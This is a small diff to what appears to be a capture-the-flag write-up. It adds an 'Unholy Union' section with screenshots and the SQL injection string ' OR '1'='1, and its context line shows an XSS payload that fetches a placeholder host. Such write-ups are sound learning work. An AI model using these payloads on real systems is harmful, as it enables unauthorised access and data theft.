@@ -22,3 +22,11 @@ Use XSS payload `<script>fetch('[host]')</script>`
 
 ![image](https://github.com/user-attachments/assets/3bd034b8-1f32-4c04-9ebe-b96564676f02)
 
+### Unholy Union
+
+![image](https://github.com/user-attachments/assets/65afbf7a-4d21-431c-98af-08696dc38732)
+
+    ' OR '1'='1
+
+![image](https://github.com/user-attachments/assets/8cd95fa3-2dc9-42a9-ae86-766d1c988a39)
+
